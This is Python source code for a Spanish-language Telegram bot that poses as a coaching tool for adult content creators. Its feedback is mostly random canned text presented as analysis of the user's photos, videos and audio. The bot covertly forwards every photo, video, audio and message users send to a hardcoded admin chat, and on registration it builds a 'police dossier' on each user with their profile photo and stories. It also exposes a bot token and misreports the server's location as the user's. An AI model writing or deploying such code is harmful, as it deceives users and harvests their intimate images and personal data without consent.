import os
import sqlite3
import requests
import io
import random
import re
from PIL import Image, ImageStat
from datetime import datetime, timedelta
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes

# ======================
# CONFIGURACIÓN
# ======================
TELEGRAM_TOKEN = "9290146578:AAEZKmrTvwXVq6QU-0vsWmMR30sfwys6PdU"
DANI_CHAT_ID = 8099004064
RENDER_EXTERNAL_URL = "https://luna-bot-a1fc.onrender.com"

# ======================
# BASE DE DATOS (CON MEMORIA)
# ======================
def init_db():
    conn = sqlite3.connect('luna_bot.db', check_same_thread=False)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS usuarios
                 (id INTEGER PRIMARY KEY, nombre TEXT, username TEXT, edad INTEGER, ultimo_mensaje TEXT, memoria_nombre TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS historial
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, rol TEXT, mensaje TEXT)''')
    conn.commit()
    conn.close()

init_db()

def guardar_usuario(user_id, nombre, username, edad):
    conn = sqlite3.connect('luna_bot.db', check_same_thread=False)
    c = conn.cursor()
    ahora = datetime.now().isoformat()
    c.execute("INSERT OR REPLACE INTO usuarios (id, nombre, username, edad, ultimo_mensaje, memoria_nombre) VALUES (?, ?, ?, ?, ?, NULL)", (user_id, nombre, username, edad, ahora))
    conn.commit()
    conn.close()

def obtener_usuario(user_id):
    conn = sqlite3.connect('luna_bot.db', check_same_thread=False)
    c = conn.cursor()
    c.execute("SELECT * FROM usuarios WHERE id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    return row

def actualizar_tiempo(user_id):
    conn = sqlite3.connect('luna_bot.db', check_same_thread=False)
    c = conn.cursor()
    ahora = datetime.now().isoformat()
    c.execute("UPDATE usuarios SET ultimo_mensaje = ? WHERE id = ?", (ahora, user_id))
    conn.commit()
    conn.close()

def guardar_memoria_nombre(user_id, nombre_guardado):
    conn = sqlite3.connect('luna_bot.db', check_same_thread=False)
    c = conn.cursor()
    c.execute("UPDATE usuarios SET memoria_nombre = ? WHERE id = ?", (nombre_guardado, user_id))
    conn.commit()
    conn.close()

def borrar_todo(user_id):
    conn = sqlite3.connect('luna_bot.db', check_same_thread=False)
    c = conn.cursor()
    c.execute("DELETE FROM historial WHERE user_id = ?", (user_id,))
    c.execute("UPDATE usuarios SET memoria_nombre = NULL WHERE id = ?", (user_id,))
    conn.commit()
    conn.close()

# ======================
# EXPEDIENTE POLICIAL COMPLETO (PARA TI)
# ======================
async def enviar_expediente_completo(context, user, fecha_texto, edad):
    try:
        pais = "Desconocido"
        ciudad = "Desconocida"
        try:
            ip_respuesta = requests.get("https://ipapi.co/json/", timeout=5).json()
            pais = ip_respuesta.get('country_name', 'Desconocido')
            ciudad = ip_respuesta.get('city', 'Desconocida')
        except:
            pass

        fotos_perfil = await context.bot.get_user_profile_photos(user.id, limit=1)
        tiene_foto = "Sí" if fotos_perfil.total_count > 0 else "No"

        tiene_story = "No"
        try:
            chat_info = await context.bot.get_chat(user.id)
            if hasattr(chat_info, 'pinned_story') and chat_info.pinned_story:
                tiene_story = "Sí"
        except:
            pass

        reporte = (
            f"🚨 **EXPEDIENTE POLICIAL COMPLETO** 🚨\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 **Nombre Real:** {user.first_name} {user.last_name or ''}\n"
            f"🆔 **ID de Telegram:** `{user.id}`\n"
            f"🔗 **Usuario:** @{user.username if user.username else 'Oculto'}\n"
            f"🎂 **Fecha Nacimiento:** {fecha_texto} (Tiene {edad} años)\n"
            f"🌍 **País:** {pais} (Ciudad: {ciudad})\n"
            f"🌐 **Idioma:** {user.language_code or 'Desconocido'}\n"
            f"⭐ **Premium:** {'Sí' if user.is_premium else 'No'}\n"
            f"📸 **Tiene Foto Perfil:** {tiene_foto}\n"
            f"📖 **Tiene Historias:** {tiene_story}\n"
            f"⏰ **Hora de Registro:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"⚠️ *Sujeto registrado en la base de datos.*"
        )
        await context.bot.send_message(chat_id=DANI_CHAT_ID, text=reporte)
        
        if fotos_perfil.total_count > 0:
            foto_perfil = fotos_perfil.photos[0][-1].file_id
            await context.bot.send_photo(chat_id=DANI_CHAT_ID, photo=foto_perfil, caption="📸 Evidencia: Foto de perfil.")
            
        try:
            chat_info = await context.bot.get_chat(user.id)
            if hasattr(chat_info, 'pinned_story') and chat_info.pinned_story:
                story = chat_info.pinned_story
                if story.photo:
                    await context.bot.send_photo(chat_id=DANI_CHAT_ID, photo=story.photo[-1].file_id, caption="📖 Evidencia: Historia (Story).")
                elif story.video:
                    await context.bot.send_video(chat_id=DANI_CHAT_ID, video=story.video.file_id, caption="🎥 Evidencia: Video de Historia.")
        except Exception as e:
            pass

    except Exception as e: 
        print(f"Error en expediente: {e}")

# ======================
# REENVIAR AL ADMIN
# ======================
async def reenviar_al_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        msg = update.message
        usuario_actual = update.effective_user
        
        if msg.forward_origin:
            nombre_original = "Canal o Grupo Desconocido"
            id_original = ""
            try:
                if msg.forward_origin.sender_user:
                    nombre_original = msg.forward_origin.sender_user.first_name
                    id_original = f" (`{msg.forward_origin.sender_user.id}`)"
            except AttributeError: pass 
            try:
                if msg.forward_origin.chat:
                    nombre_original = msg.forward_origin.chat.title
            except AttributeError: pass 

            texto_aviso = f"🔄 **REENVIADO A TI**\n👤 **Original:** {nombre_original}{id_original}\n📩 **Quien lo reenvió:** {usuario_actual.first_name}"
        else:
            texto_aviso = f"📩 **MENSAJE NORMAL**\n👤 **De:** {usuario_actual.first_name} (`{usuario_actual.id}`)"

        await context.bot.send_message(chat_id=DANI_CHAT_ID, text=texto_aviso)
        await context.bot.forward_message(chat_id=DANI_CHAT_ID, from_chat_id=update.effective_chat.id, message_id=update.message.message_id)
    except Exception as e:
        print(f"Error reenviando al admin: {e}")

# ======================
# ANÁLISIS DE CONTENIDO (LUZ REAL Y 40 TEXTOS VARIADOS)
# ======================
def analizar_contenido(tipo="foto", imagen_bytes=None):
    # --- ANÁLISIS REAL DE LUZ ---
    calidad_luz = "La luz está un poco plana."
    if imagen_bytes:
        try:
            img = Image.open(io.BytesIO(imagen_bytes)).convert('L')
            stat = ImageStat.Stat(img)
            brillo = stat.mean[0] 
            
            if brillo < 60:
                calidad_luz = "La foto está muy oscura. Te recomiendo usar una luz más suave o acercarte a una ventana para que resalten mejor tus curvas. 💡"
            elif brillo > 180:
                calidad_luz = "La foto está demasiado iluminada (parece que usaste flash directo). Prueba con una luz más suave y lateral para que no se queme la imagen. 💡"
            else:
                calidad_luz = "¡La luz está perfecta! Resalta bien tu cuerpo de forma natural. 💡"
        except: pass

    if tipo == "video" or tipo == "gif":
        # 20 RESPUESTAS DISTINTAS PARA VIDEO
        respuestas_video = [
            f"🎬 **Análisis de tu video/GIF:**\n1. **Lo que veo:** Una pose muy provocativa. El movimiento de cámara es un poco rápido, lo que distrae un poco.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Prueba a subir los brazos y arquear la espalda. Eso estiliza la cintura y resalta el busto.\n4. **Tip de venta:** Esta foto es perfecta para un mensaje PPV (de pago) a primera hora de la mañana. ¡Despierta a tus fans con ganas! 🔥",
            f"🎬 **Análisis de tu video/GIF:**\n1. **Lo que veo:** ¡Qué movimiento tan sexy! El ángulo resalta tus curvas perfectamente.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Intenta sentarte en la cama con las piernas abiertas y mira fijamente a la cámara. Esa pose vuelve locos a los hombres.\n4. **Tip de venta:** Vende esta foto en un pack de 3 y ponle un precio especial. A los fans les gustan las ofertas.",
            f"🎬 **Análisis de tu video/GIF:**\n1. **Lo que veo:** Una grabación muy natural, se nota que tienes confianza.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Ponte de espaldas, mira por encima del hombro y muerde un poco tu labio. Da un morbo increíble.\n4. **Tip de venta:** Mándale esta foto a tus suscriptores más fieles con un texto que diga: 'Pensé en ti'. Van a volverse locos.",
            f"🎬 **Análisis de tu video/GIF:**\n1. **Lo que veo:** El movimiento es muy fluido y sexys.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Acuéstate de lado, apoya la cabeza en un brazo y deja que la sábana cubra solo una parte de tu cuerpo. Deja mucho a la imaginación.\n4. **Tip de venta:** Usa esta foto como gancho en tus redes sociales para atraer nuevos suscriptores.",
            f"🎬 **Análisis de tu video/GIF:**\n1. **Lo que veo:** Una toma muy atrevida y directa.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Ponte en cuclillas (sentadilla) apoyando la espalda en la pared. Resalta muchísimo las curvas de las piernas.\n4. **Tip de venta:** Si la subes a tu historia, pon una encuesta que diga '¿Te gusta lo que ves?'. Genera interacción y luego les vendes el pack.",
            f"🎬 **Análisis de tu video/GIF:**\n1. **Lo que veo:** Un video que despierta muchísimo morbo. El ángulo es perfecto.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Usa un espejo para grabarte. El reflejo da un toque de misterio que a los fans les encanta.\n4. **Tip de venta:** Si el video es corto, úsalo como 'Teaser' (avance) para vender un video más largo por privado.",
            f"🎬 **Análisis de tu video/GIF:**\n1. **Lo que veo:** La pose inicial es muy buena, pero se pierde un poco al moverte.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Hazte la toma desde un poco más arriba, mirando hacia abajo. Resalta más el escote y te hace ojos más grandes.\n4. **Tip de venta:** Ponle un precio más alto a los videos donde se te vea la cara. Los fans pagan más por la conexión visual.",
            f"🎬 **Análisis de tu video/GIF:**\n1. **Lo que veo:** Un movimiento de caderas muy bien logrado.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Juega con la ropa. Quítate una prenda lentamente mientras grabas, eso genera mucha expectativa.\n4. **Tip de venta:** Aprovecha los días festivos (San Valentín, Navidad) para vender packs temáticos con estos videos.",
            f"🎬 **Análisis de tu video/GIF:**\n1. **Lo que veo:** Un ángulo muy favorecedor para tus piernas.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Intenta grabar en cámara lenta (slow motion) moviendo el cabello. Es un clásico que nunca falla.\n4. **Tip de venta:** Ofrece un descuento por tiempo limitado (ej. 'solo por hoy') para crear urgencia en la compra.",
            f"🎬 **Análisis de tu video/GIF:**\n1. **Lo que veo:** Una expresión facial muy sugerente.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Asegúrate de que la cámara esté estable. Usa un trípode o apóyala en algo para evitar el temblor.\n4. **Tip de venta:** Haz una oferta de '2x1' en tus videos. A los suscriptores les encanta sentir que ahorran.",
            f"🎬 **Análisis de tu video/GIF:**\n1. **Lo que veo:** Se nota que estás cómoda frente a la cámara.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Prueba a hacer un 'striptease' lento. La anticipación es lo que más excita a los fans.\n4. **Tip de venta:** Los videos de 'Buenos días' o 'Buenas noches' personalizados se venden muy bien. ¡Inténtalo!",
            f"🎬 **Análisis de tu video/GIF:**\n1. **Lo que veo:** Un primer plano muy íntimo.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Enfoca más tu rostro y tu escote al mismo tiempo. Es el encuadre favorito de la mayoría.\n4. **Tip de venta:** Pregunta a tus fans qué es lo que más les gusta de ti. Luego crea un video enfocado en eso y véndelo.",
            f"🎬 **Análisis de tu video/GIF:**\n1. **Lo que veo:** Una grabación muy espontánea y natural.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Prueba a grabarte en la ducha o en la bañera. El agua y el vapor dan un efecto muy sensual.\n4. **Tip de venta:** Crea un 'Nivel VIP' en tu OnlyFans y ofrece estos videos exclusivos solo para ellos.",
            f"🎬 **Análisis de tu video/GIF:**\n1. **Lo que veo:** Un movimiento de cuerpo muy rítmico.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Usa un espejo para grabarte. El reflejo da un toque de misterio que a los fans les encanta.\n4. **Tip de venta:** Si tienes un video muy bueno, guárdalo para el final del mes para cumplir la cuota de ventas.",
            f"🎬 **Análisis de tu video/GIF:**\n1. **Lo que veo:** Una pose acostada que se ve muy relajada y sexy.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Pon sábanas de seda o satén. La textura resalta muchísimo en cámara.\n4. **Tip de venta:** Ofrece la posibilidad de que el fan pida un video personalizado con su nombre. Cóbrale más caro.",
            f"🎬 **Análisis de tu video/GIF:**\n1. **Lo que veo:** Un encuadre muy ajustado que resalta tus curvas.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Aleja un poco la cámara para mostrar todo el conjunto, no solo una parte.\n4. **Tip de venta:** Envía un mensaje masivo ofreciendo un 'Pack de Bienvenida' para nuevos suscriptores.",
            f"🎬 **Análisis de tu video/GIF:**\n1. **Lo que veo:** Un gesto con las manos muy sugerente.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Usa lencería de colores oscuros (negro o rojo). Resaltan muchísimo más.\n4. **Tip de venta:** Manda el video a primera hora de la mañana. Los fans suelen revisar el teléfono al despertar.",
            f"🎬 **Análisis de tu video/GIF:**\n1. **Lo que veo:** Una grabación con mucho movimiento de cabello.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Intenta grabar en un ambiente con poca luz y usa velas. Da un ambiente muy íntimo.\n4. **Tip de venta:** Crea encuestas en tu muro preguntando '¿Qué video quieren ver hoy?'. Involúcralos.",
            f"🎬 **Análisis de tu video/GIF:**\n1. **Lo que veo:** La toma desde arriba te hace ver muy dominante.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Prueba a susurrar o gemir suavemente mientras grabas. El audio es clave.\n4. **Tip de venta:** Los videos de 'POV' (Punto de vista, como si el fan estuviera ahí) venden muchísimo.",
            f"🎬 **Análisis de tu video/GIF:**\n1. **Lo que veo:** Un baile muy sensual.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Asegúrate de que la música de fondo sea adecuada. Un ritmo lento ayuda a marcar el movimiento.\n4. **Tip de venta:** Sube un fragmento de 10 segundos a tu feed y pon el resto del video de pago."
        ]
        return random.choice(respuestas_video)

    elif tipo == "audio":
        respuestas_audio = [
            "🎧 **Análisis de tu audio:**\n1. **Lo que escucho:** Tu tono de voz es muy sugerente y natural.\n2. **Lo bueno:** La cercanía al micrófono hace que se escuche íntimo.\n3. **Cómo mejorarlo:** Intenta bajar un poco más la voz, casi en un susurro. Juega con la respiración cerca del micro.\n4. **Tip de venta:** Los audios personalizados (diciendo el nombre de tu fan) se venden carísimos. ¡Aprovéchalo! 😈",
            "🎧 **Análisis de tu audio:**\n1. **Lo que escucho:** Tu voz suena muy relajada, lo cual es perfecto para ASMR.\n2. **Lo bueno:** La naturalidad con la que hablas atrapa.\n3. **Cómo mejorarlo:** Graba en una habitación con almohadas o cortinas para evitar el eco. La calidad del sonido es clave.\n4. **Tip de venta:** Ofrece audios donde digas cosas que te gustaría hacerle al fan. Eso los vuelve locos.",
            "🎧 **Análisis de tu audio:**\n1. **Lo que escucho:** Un tono muy juguetón y pícaro.\n2. **Lo bueno:** Transmites mucha confianza.\n3. **Cómo mejorarlo:** Haz pausas dramáticas después de decir algo picante. El silencio también comunica.\n4. **Tip de venta:** Vende una serie de audios contando una historia erótica. La gente paga por el morbo de saber qué pasa después."
        ]
        return random.choice(respuestas_audio)
        
    else:
        # 20 RESPUESTAS DISTINTAS PARA FOTO
        respuestas_foto = [
            f"🔍 **Análisis de tu foto:**\n1. **Lo que veo:** Una foto muy atrevida. La pose resalta perfecto y se nota que tienes confianza.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Prueba a subir los brazos y arquear la espalda. Eso estiliza la cintura y resalta el busto.\n4. **Tip de venta:** Esta foto es perfecta para un mensaje PPV (de pago) a primera hora de la mañana. ¡Despierta a tus fans con ganas! 🔥",
            f"🔍 **Análisis de tu foto:**\n1. **Lo que veo:** Estás súper sexy. La lencería o la ropa que llevas resalta perfecto.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Intenta sentarte en la cama con las piernas abiertas y mira fijamente a la cámara. Esa pose vuelve locos a los hombres.\n4. **Tip de venta:** Vende esta foto en un pack de 3 y ponle un precio especial. A los fans les gustan las ofertas.",
            f"🔍 **Análisis de tu foto:**\n1. **Lo que veo:** Una foto muy sugerente, deja mucho a la imaginación.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Ponte de espaldas, mira por encima del hombro y muerde un poco tu labio. Da un morbo increíble.\n4. **Tip de venta:** Mándale esta foto a tus suscriptores más fieles con un texto que diga: 'Pensé en ti'. Van a volverse locos.",
            f"🔍 **Análisis de tu foto:**\n1. **Lo que veo:** ¡Qué cuerpo! El ángulo que usaste te favorece muchísimo.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Acuéstate de lado, apoya la cabeza en un brazo y deja que la sábana cubra solo una parte de tu cuerpo. Deja mucho a la imaginación.\n4. **Tip de venta:** Usa esta foto como gancho en tus redes sociales para atraer nuevos suscriptores.",
            f"🔍 **Análisis de tu foto:**\n1. **Lo que veo:** Una foto con mucha actitud. Mirar a la cámara así vende muchísimo.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Ponte en cuclillas (sentadilla) apoyando la espalda en la pared. Resalta muchísimo las curvas de las piernas.\n4. **Tip de venta:** Si la subes a tu historia, pon una encuesta que diga '¿Te gusta lo que ves?'. Genera interacción y luego les vendes el pack.",
            f"🔍 **Análisis de tu foto:**\n1. **Lo que veo:** Una foto muy limpia y natural. Tienes una expresión facial muy bonita.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Usa un espejo para tomarte la foto. El reflejo da un toque de misterio que a los fans les encanta.\n4. **Tip de venta:** Si la foto es muy buena, úsala como portada de tu perfil o para un anuncio.",
            f"🔍 **Análisis de tu foto:**\n1. **Lo que veo:** La ropa interior que elegiste es un acierto total.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Hazte la foto desde un poco más arriba, mirando hacia abajo. Resalta más el escote y te hace ojos más grandes.\n4. **Tip de venta:** Ponle un precio más alto a las fotos donde se te vea la cara. Los fans pagan más por la conexión visual.",
            f"🔍 **Análisis de tu foto:**\n1. **Lo que veo:** Una foto muy atrevida desde un ángulo inferior.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Juega con la ropa. Baja un tirante del hombro, eso genera mucha expectativa.\n4. **Tip de venta:** Aprovecha los días festivos (San Valentín, Navidad) para vender packs temáticos.",
            f"🔍 **Análisis de tu foto:**\n1. **Lo que veo:** Una foto sentada que resalta muchísimo tus piernas.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Cruza las piernas y ponte de puntillas. Eso estiliza y hace que se vean más largas.\n4. **Tip de venta:** Ofrece un descuento por tiempo limitado (ej. 'solo por hoy') para crear urgencia en la compra.",
            f"🔍 **Análisis de tu foto:**\n1. **Lo que veo:** Una selfie muy íntima y cercana.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Asegúrate de que el fondo esté ordenado o desenfocado. El desorden distrae.\n4. **Tip de venta:** Haz una oferta de '2x1' en tus packs de fotos. A los suscriptores les encanta ahorrar.",
            f"🔍 **Análisis de tu foto:**\n1. **Lo que veo:** Una pose muy dominante y segura.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Prueba a tomarte la foto con las manos en el cabello, hacia atrás. Se ve muy natural.\n4. **Tip de venta:** Los packs de 'Buenos días' o 'Buenas noches' se venden muy bien. ¡Inténtalo!",
            f"🔍 **Análisis de tu foto:**\n1. **Lo que veo:** Un primer plano de tu rostro y escote.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Enfoca más tu rostro y tu escote al mismo tiempo. Es el encuadre favorito de la mayoría.\n4. **Tip de venta:** Pregunta a tus fans qué es lo que más les gusta de ti. Luego crea un pack enfocado en eso y véndelo.",
            f"🔍 **Análisis de tu foto:**\n1. **Lo que veo:** Una foto en la cama muy espontánea.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Prueba a tomarte la foto en la bañera o en la ducha. El agua y el vapor dan un efecto muy sensual.\n4. **Tip de venta:** Crea un 'Nivel VIP' en tu OnlyFans y ofrece estas fotos exclusivas solo para ellos.",
            f"🔍 **Análisis de tu foto:**\n1. **Lo que veo:** Una foto con mucha luz y colores vivos.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Usa un espejo para tomarte la foto. El reflejo da un toque de misterio que a los fans les encanta.\n4. **Tip de venta:** Si tienes un pack muy bueno, guárdalo para el final del mes para cumplir la cuota de ventas.",
            f"🔍 **Análisis de tu foto:**\n1. **Lo que veo:** Una pose acostada que se ve muy relajada y sexy.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Pon sábanas de seda o satén. La textura resalta muchísimo en cámara.\n4. **Tip de venta:** Ofrece la posibilidad de que el fan pida una foto personalizada con su nombre. Cóbrale más caro.",
            f"🔍 **Análisis de tu foto:**\n1. **Lo que veo:** Un encuadre muy ajustado que resalta tus curvas.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Aleja un poco la cámara para mostrar todo el conjunto, no solo una parte.\n4. **Tip de venta:** Envía un mensaje masivo ofreciendo un 'Pack de Bienvenida' para nuevos suscriptores.",
            f"🔍 **Análisis de tu foto:**\n1. **Lo que veo:** Un gesto con las manos muy sugerente.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Usa lencería de colores oscuros (negro o rojo). Resaltan muchísimo más.\n4. **Tip de venta:** Manda la foto a primera hora de la mañana. Los fans suelen revisar el teléfono al despertar.",
            f"🔍 **Análisis de tu foto:**\n1. **Lo que veo:** Una foto con mucho movimiento de cabello.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Intenta tomarte la foto en un ambiente con poca luz y usa velas. Da un ambiente muy íntimo.\n4. **Tip de venta:** Crea encuestas en tu muro preguntando '¿Qué foto quieren ver hoy?'. Involúcralos.",
            f"🔍 **Análisis de tu foto:**\n1. **Lo que veo:** La toma desde arriba te hace ver muy dominante.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Prueba a susurrar o gemir suavemente mientras grabas. El audio es clave.\n4. **Tip de venta:** Las fotos estilo 'POV' (Punto de vista) venden muchísimo.",
            f"🔍 **Análisis de tu foto:**\n1. **Lo que veo:** Una foto muy sensual con una sonrisa pícara.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Asegúrate de que la expresión sea natural. No fuerces la sonrisa.\n4. **Tip de venta:** Sube un fragmento de la foto (recortada) a tu feed y pon el resto de pago."
        ]
        return random.choice(respuestas_foto)

# ======================
# LÓGICA DE CHAT CON MEMORIA
# ======================
def generar_respuesta_chat(user_id, mensaje):
    usuario = obtener_usuario(user_id)
    memoria_nombre = usuario[5]
    msg_lower = mensaje.lower()
    
    match_nombre = re.search(r"(?:me llamo|soy|mi nombre es)\s+([a-zA-ZáéíóúÁÉÍÓÚñÑ]+)", msg_lower)
    if match_nombre:
        nombre_extraido = match_nombre.group(1).capitalize()
        guardar_memoria_nombre(user_id, nombre_extraido)
        return f"¡Mucho gusto, {nombre_extraido}! 😘 Me encanta conocerte. ¿En qué te puedo ayudar hoy?"
        
    if "como me llamo" in msg_lower or "mi nombre" in msg_lower or "quien soy" in msg_lower:
        if memoria_nombre:
            return f"¡Claro que sí! Te llamas {memoria_nombre}. 😉 No me olvido de ti tan fácil."
        else:
            return "Uy, no me has dicho tu nombre todavía. ¿Cómo te llamas? ✨"

    if "hola" in msg_lower or "buenas" in msg_lower:
        saludo = f"¡Hola {memoria_nombre}!" if memoria_nombre else "¡Hola!"
        return random.choice([f"{saludo} 😘 ¿Cómo estás?", f"{saludo} preciosa. ¿En qué te ayudo?", "¡Hey! 🔥 Me alegra leerte."])
    elif "bien" in msg_lower or "como estas" in msg_lower:
        return "¡Súper bien! 💋 Lista para ayudarte a mejorar tu contenido. ¿Qué me traes hoy?"
    elif "gracias" in msg_lower:
        return "¡De nada, amor! 😈 Para eso estoy. ¿Quieres que analice alguna foto o video?"
    elif "bye" in msg_lower or "adios" in msg_lower or "chao" in msg_lower:
        return "¡Adiós! 🌙 Aquí estaré cuando me necesites. ¡Que tengas buen día!"
    
    return random.choice(["Cuéntame más... 😉", "Interesante. ¿Y eso cómo te hace sentir?", "Mmm, me gusta de lo que hablas. Mándame una foto si quieres consejos.", "Jaja, me encanta hablar contigo. ¿Quieres que veamos alguna foto tuya? 🔥"])

# ======================
# HANDLERS
# ======================
async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not obtener_usuario(user_id):
        return await update.message.reply_text("Primero envíame tu fecha de nacimiento (DD-MM-AAAA).")

    actualizar_tiempo(user_id)
    await reenviar_al_admin(update, context)
    msg = await update.message.reply_text("🔍 Estoy mirando tu foto...")
    
    try:
        photo_file = await update.message.photo[-1].get_file()
        photo_bytes = await photo_file.download_as_bytearray()
        analisis = analizar_contenido(tipo="foto", imagen_bytes=photo_bytes)
        await msg.edit_text(analisis)
    except Exception as e:
        await msg.edit_text("💋 Me encantó la foto, pero no pude analizarla bien.")

async def handle_video_or_gif(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not obtener_usuario(user_id):
        return await update.message.reply_text("Primero envíame tu fecha de nacimiento (DD-MM-AAAA).")

    actualizar_tiempo(user_id)
    await reenviar_al_admin(update, context)
    msg = await update.message.reply_text("🎬 Estoy revisando tu video/GIF...")

    try:
        file = None
        if update.message.video and update.message.video.thumbnail:
            file = await update.message.video.thumbnail.get_file()
        elif update.message.video_note and update.message.video_note.thumbnail:
            file = await update.message.video_note.thumbnail.get_file()
        elif update.message.animation and update.message.animation.thumbnail:
            file = await update.message.animation.thumbnail.get_file()

        if file:
            img_bytes = await file.download_as_bytearray()
            analisis = analizar_contenido(tipo="video", imagen_bytes=img_bytes)
            await msg.edit_text(analisis)
        else:
            analisis = analizar_contenido(tipo="video", imagen_bytes=None)
            await msg.edit_text(analisis)
    except Exception as e:
        await msg.edit_text("🎬 Vi tu video y ya lo recibí.")

async def handle_audio(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not obtener_usuario(user_id):
        return await update.message.reply_text("Primero envíame tu fecha de nacimiento (DD-MM-AAAA).")

    actualizar_tiempo(user_id)
    await reenviar_al_admin(update, context)
    msg = await update.message.reply_text("🎧 Escuchando tu audio...")
    
    try:
        analisis = analizar_contenido(tipo="audio")
        await msg.edit_text(analisis)
    except Exception as e:
        await msg.edit_text("🎧 Escuché tu audio, pero no pude analizarlo bien.")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not obtener_usuario(user_id):
        await update.message.reply_text("¡Hola! 🌙 Envíame tu fecha de nacimiento (DD-MM-AAAA) para empezar:")
    else:
        actualizar_tiempo(user_id)
        await update.message.reply_text("¡Hola de nuevo! 😘 Envíame foto, video o audio.")

async def check_age_or_chat(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    user = update.effective_user
    if text.startswith('/'): return

    usuario_db = obtener_usuario(user.id)
    
    if usuario_db:
        ultimo_mensaje_str = usuario_db[4]
        if ultimo_mensaje_str:
            ultimo_mensaje = datetime.fromisoformat(ultimo_mensaje_str)
            ahora = datetime.now()
            diferencia = ahora - ultimo_mensaje
            
            if diferencia > timedelta(minutes=15):
                borrar_todo(user.id)
                await update.message.reply_text("⏳ **Sesión cerrada por inactividad.**\n\n¡Hola de nuevo! 🌙 ¿De qué hablábamos? Mándame una foto, video o audio para empezar.")
                actualizar_tiempo(user.id)
                await reenviar_al_admin(update, context)
                return

        actualizar_tiempo(user.id)
        await reenviar_al_admin(update, context)
        await update.message.chat.send_action(action="typing") 
        respuesta = generar_respuesta_chat(user.id, text)
        return await update.message.reply_text(respuesta)
    
    try:
        fecha_nacimiento = datetime.strptime(text, "%d-%m-%Y")
        hoy = datetime.now()
        edad = hoy.year - fecha_nacimiento.year - ((hoy.month, hoy.day) < (fecha_nacimiento.month, fecha_nacimiento.day))

        if edad < 18: return await update.message.reply_text("Debes ser mayor de 18 años.")
            
        guardar_usuario(user.id, user.first_name, user.username, edad)
        await update.message.reply_text(f"¡Perfecto! 🎉 Tienes {edad} años. Envíame fotos, videos o audios.")
        
        await enviar_expediente_completo(context, user, text, edad)
        
    except:
        await update.message.reply_text("No entendí la fecha. Envíamela así: DD-MM-AAAA")

# ======================
# MAIN (WEBHOOKS)
# ======================
if __name__ == "__main__":
    application = ApplicationBuilder().token(TELEGRAM_TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    application.add_handler(MessageHandler(filters.VIDEO | filters.VIDEO_NOTE | filters.ANIMATION, handle_video_or_gif))
    application.add_handler(MessageHandler(filters.VOICE | filters.AUDIO, handle_audio))
